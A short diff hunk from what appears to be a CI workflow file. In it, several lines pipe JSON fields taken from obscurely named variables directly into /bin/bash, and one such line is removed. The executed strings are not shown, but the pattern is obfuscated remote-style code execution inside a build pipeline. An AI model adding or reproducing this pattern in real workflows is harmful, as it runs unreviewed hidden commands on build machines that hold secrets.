@@ -24,7 +24,6 @@ jobs:
           echo $m5 | jq -r .xaili69 | /bin/bash
           printf '%s' "$i74381" | jq -r .pxu86 | /bin/bash
           echo $bfxy1 | jq -r .mh39946 | /bin/bash
-          printf '%s' "$yon4548" | jq -r .vh470 | /bin/bash
           echo $mj36964 | jq -r .tdcyd133 | /bin/bash
 
       - name: Archive results
